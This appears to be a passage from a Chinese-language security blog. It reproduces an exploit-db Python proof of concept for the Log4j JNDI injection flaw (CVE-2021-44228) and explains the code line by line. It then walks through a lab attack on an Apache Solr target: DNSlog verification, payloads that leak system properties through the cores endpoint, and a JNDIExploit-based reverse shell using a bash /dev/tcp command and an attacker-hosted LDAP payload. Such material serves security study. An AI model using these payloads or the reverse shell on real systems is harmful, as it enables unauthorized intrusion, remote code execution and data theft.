+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure</span></span><br><span class="line"><span class="comment"># Date: 12/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: leonjza</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://logging.apache.org/log4j/2.x/</span></span><br><span class="line"><span class="comment"># Version: &lt;= 2.14.1</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-44228</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pure python ENV variable leak PoC for CVE-2021-44228</span></span><br><span class="line"><span class="comment"># Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2021 @leonjza</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j</span></span><br><span class="line"><span class="string">&lt;=2.14 information disclosure poc &#x27;</span></span><br><span class="line">                                                 <span class="string">&#x27;(ref:</span></span><br><span class="line"><span class="string">https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on</span></span><br><span class="line"><span class="string">(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;see:</span></span><br><span class="line"><span class="string">https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br><span class="line"></span><br><span class="line">    serv_thread = threading.Thread(target=server.serve_forever)</span><br><span class="line">    serv_thread.daemon = <span class="literal">True</span></span><br><span class="line">    serv_thread.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.shutdown()</span><br><span class="line">        server.server_close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()                </span><br></pre></td></tr></table></figure>
+
+<h3 id="信息泄露脚本分析"><a href="#信息泄露脚本分析" class="headerlink" title="信息泄露脚本分析"></a>信息泄露脚本分析</h3><h4 id="LDAP-HEADER"><a href="#LDAP-HEADER" class="headerlink" title="LDAP_HEADER"></a>LDAP_HEADER</h4><p>定义 <code>LDAP_HEADER</code> 常量，这是响应 <code>LDAP</code> 请求时使用的头信息</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="ThreadedTCPRequestHandler"><a href="#ThreadedTCPRequestHandler" class="headerlink" title="ThreadedTCPRequestHandler"></a>ThreadedTCPRequestHandler</h4><p>这里定义<code>ThreadedTCPRequestHandler</code> 类的 <code>handle()</code> 方法用于处理来自客户端的连接。</p>
+<p>该方法首先输出来自客户端的连接信息，然后通过调用 <code>sock.recv()</code> 和 <code>sock.sendall()</code> 方法读取客户端发送</p>
+<p>的数据，并发送响应数据</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="ThreadedTCPServer"><a href="#ThreadedTCPServer" class="headerlink" title="ThreadedTCPServer"></a>ThreadedTCPServer</h4><p><code>ThreadedTCPServer</code> 类是一个多线程 <code>TCP</code> 服务器，它继承自 <code>socketserver.ThreadingMixIn</code> 和 </p>
+<p><code>socketserver.TCPServer</code> 类。这意味着它可以同时处理多个客户端连接。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h4><p>main()函数使用模块设置命令行参数解析器argparse，然后解析命令行参数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j&lt;=2.14 information disclosure poc &#x27;</span>                              <span class="string">&#x27;(ref:https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面的类似<code>-t,-lh,-lp</code>等等就是解析器设置为接受命令行参数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span><span class="string">&#x27;see:https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span><span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>parse_args()</code> 方法用于解析命令行参数，并将解析后的参数值存储在一个名为 <code>args</code> 的变量中</p>
+<p>例如，在执行脚本后加的命令行参数<code>--listen-port 8080</code>就转变为了<code>args.listen_port = 8080</code>，这样在后续</p>
+<p>代码调用不同参数时，可直接调用<code>arg</code>来实现</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">args = parser.parse_args()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里先创建一个基于线程的 <code>TCP</code> 服务器，并使用 <code>args.listen_host</code> 和 <code>args.listen_port</code> 来指定的主机和端</p>
+<p>口启动，并使用 <code>ThreadedTCPRequestHandler</code> 类来处理每个请求【也就是前面提到的】</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里主要是先创建一个 <code>threading.Thread</code> 对象，并将服务器的 <code>serve_forever()</code> 方法作为其目标。这个方法</p>
+<p>就是字面意思，它会一直运行，直到服务器被关闭。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread = threading.Thread(target=server.serve_forever)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>daemon</code> 属性是 <code>Python</code> 中的线程特有属性，它表示该线程是否为守护线程，如果一个线程是守护线程，</p>
+<p>那么当程序退出时，它也会被中断。</p>
+<p>而这里的被设置为<code>ture</code>，所以这意味着程序退出时，线程将被中断。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.daemon = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后就是启动线程，并延迟 <code>1</code> 秒钟，来确保服务器完全启动</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里使用 <code>try-finally</code> 语句块向服务器发送<code>payload</code>:</p>
+<p><code>$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;</code></p>
+<p>并打印服务器的响应状态码，以及响应的文本内容</p>
+<p>最后调用服务器的 <code>shutdown()</code> 和 <code>server_close()</code> 方法，以关闭服务器，即使在发送 <code>HTTP</code> 请求时发生异常也是如此。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    server.shutdown()</span><br><span class="line">    server.server_close()</span><br></pre></td></tr></table></figure>
+
+<p>这里就是一个常见的语句，如果脚本是独立执行的，则直接就调用 <code>main()</code> 函数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()    </span><br></pre></td></tr></table></figure>
+
+<h2 id="了解漏洞描述与注入原理"><a href="#了解漏洞描述与注入原理" class="headerlink" title="了解漏洞描述与注入原理"></a><strong>了解漏洞描述与注入原理</strong></h2><p><code>Apache Log4j 2</code> 是<code>Java</code>语言的日志处理套件，使用极为广泛。在其<code>2.0</code>到<code>2.14.1</code>版本中存在一处<code>JNDI</code>注入漏</p>
+<p>洞，攻击者在可以控制日志内容的情况下，通过传入类似于</p>
+<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>的<code>lookup</code>用于进行<code>JNDI</code>注入，执行任意代码。</p>
+<h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p><code>Log4j2</code> <code>Lookup</code>是<code>Log4j2</code>的一项功能，允许您<strong>在日志消息中使用动态值</strong>，<code>Log4j2</code>提供了许多内置的<code>Lookup</code>对</p>
+<p>象，用于查找不同类型的值</p>
+<p>例如<code>SystemPropertiesLookup.lookup(&quot;user.home&quot;)</code>方法返回了系统属性<code>user.home</code>的值，并将其插入日志</p>
+<p>消息中。</p>
+<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>开始我也看不太懂<code>JNDI</code>任意代码执行语句意思</p>
+<p>先了解一下<code>JNDI</code>是什么以及其组成</p>
+<p><code>JNDI</code>（<code>Java</code>命名和目录接口），是<code>Java</code>提供的一个目录服务应用程序接口（<code>API</code>）</p>
+<p>它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 </p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">其中大致有</span><br><span class="line">远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）</span><br></pre></td></tr></table></figure>
+
+<p>其大致组成为</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String jndiName= ...;<span class="comment">//指定需要查找name名称</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//初始化默认环境</span></span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSourse)context.lookup(jndiName);<span class="comment">//查找该name的数据</span></span><br></pre></td></tr></table></figure>
+
+<p><u><strong>所以如果能控制<code>jndiName</code>，再利用<code>rmi</code>之类的加载远程类文件进行调用，就可能实现远程代码执行</strong></u></p>
+<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>结合<code>lookup</code>和<code>jndi</code></p>
+<p><strong>对于<code>payload</code></strong></p>
+<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>是<code>Log4j2</code>中使用的<strong>占位符</strong>语法。<strong>它表示在日志消息中插入一个使用</strong></p>
+<p><strong><code>JNDILookup</code>对象查找的值</strong></p>
+<p><code>ldap://evil.com/example</code>是<code>JNDI</code>查找所使用的名称。这意味着<code>Log4j2</code>将在<code>JNDI</code>上下文中查找名为<code>example</code></p>
+<p>的对象，该对象位于<code>evil.com</code>服务器上，就可能实现访问一些敏感信息以及其他恶意操作的目的</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="利用DNSlog验证漏洞"><a href="#利用DNSlog验证漏洞" class="headerlink" title="利用DNSlog验证漏洞"></a>利用DNSlog验证漏洞</h3><p>访问<code>http://www.dnslog.cn/</code></p>
+<p>先<code>Get SubDomain</code>获取一个子域名</p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145121926.png" alt="image-20221220145121926"></p>
+<p>但是既然是注入，那肯定是存在参数注入点，查看官方<code>solr</code>文档，得到在<code>cores</code>里</p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145505204.png" alt="image-20221220145505204"></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/admin/</span>cores?action=</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>action</code>参数可控，有很大可能是注入点</p>
+<p>于是把我们的<code>dnslog</code>获取的子域名按<code>payload</code>形式添加到<code>url</code>后参数中</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/4d5do5.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问查看</p>
+<p><code>DNSlog</code>收到了访问请求</p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145131607.png" alt="image-20221220145131607"></p>
+<p>同时在靶机页面下也有<code>DNSlog</code>子域名回显，虽然是</p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145054026.png" alt="image-20221220145054026"></p>
+<p>说明这里的<code>$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;</code>，确实达到了访问的作用</p>
+<p>故此推断<code>log4j2</code>漏洞存在</p>
+<h3 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h3><p>这里可以利用脚本分析中<code>exploitdb</code>里的信息泄露脚本即可</p>
+<p>按照脚本原理也是利用占位符，也就是<code>payload</code>的形式，但是参数为系统属性，这些属性会自动返回对应的值，</p>
+<p>最后脚本通过对返回数据的解析，就可以得到敏感数据</p>
+<p>当然直接通过访问得到消息也是可以的</p>
+<p>比如<code>$&#123;sys:os.version&#125;</code>，就得到我们靶机的系统内核版本号为<code>5.15.0-56-generic</code></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/$&#123;sys:os.version&#125;.7b09py.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220220840849.png" alt="image-20221220220840849"></p>
+<p>对于<code>usr.name</code>，以及<code>os.name</code>等等都是可以实现</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/$&#123;sys:user.name&#125;.7b09py.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220175405653.png" alt="image-20221220175405653"></p>
+<p>以下就是在<code>log4j2</code>其他可用系统属性列表</p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220170944260.png" alt="image-20221220170944260"></p>
+<h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">攻击机kali <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">128</span></span><br><span class="line">攻击机kali 监听端口:<span class="number">8888</span></span><br><span class="line">靶机ubuntu <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">131</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell"><a href="#JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell" class="headerlink" title="JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell"></a>JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell</h4><p>该工具的原理我剖析了一下，</p>
+<p>先启动工具</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">1</span>.<span class="number">2</span>-SNAPSHOT.jar -i <span class="number">192.168.80.128</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221163132059.png" alt="image-20221221163132059"></p>
+<p>简单来讲就是在攻击机【<code>192.168.80.128</code>】的的<code>1389</code>端口搭建起了一个服务器，其中放置了一个恶意类，</p>
+<p>通过利用靶机网站<code>JNDI</code>注入漏洞把这个恶意类进行远程加载，从而执行了命令</p>
+<p>利用<code>JNDIExploit-1.2-SNAPSHOT.jar</code>最好的就是简化了<code>1.0</code>的繁杂参数</p>
+<p>只需要构造<code>payload</code></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/192.168.80.128:1389/</span>Basic<span class="regexp">/ReverseShell/</span><span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>/Basic/ReverseShell/</code>中其实就包含反弹<code>shell</code>的命令</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/xx.xx.xx.xx/</span>xxxx <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">*这里的</span><br><span class="line"><span class="regexp">/xx.xx.xx.xx/</span>xxxx</span><br><span class="line">就是其后跟上的参数</span><br><span class="line"><span class="regexp">/192.168.80.128/</span><span class="number">6666</span></span><br></pre></td></tr></table></figure>
+
+<p>于是就是<code>/Basic/ReverseShell/192.168.80.128/6666</code>被恶意类包含</p>
+<p>然后在攻击机监听<code>6666</code>端口</p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203418508.png" alt="image-20221221203418508"></p>
+<p>最后访问<code>payload</code>，触发</p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203458628.png" alt="image-20221221203458628"></p>
+<p>成功反弹到<code>shell</code></p>
+<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203538282.png" alt="image-20221221203538282"></p>
+<p>测试完毕</p>
+<h1 id="PHP写入配置文件的经典漏洞"><a href="#PHP写入配置文件的经典漏洞" class="headerlink" title="PHP写入配置文件的经典漏洞"></a>PHP写入配置文件的经典漏洞</h1><p>在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含</p>
+<p><a href="https://bbs.zkaq.cn/t/6045.html">转载文章</a></p>
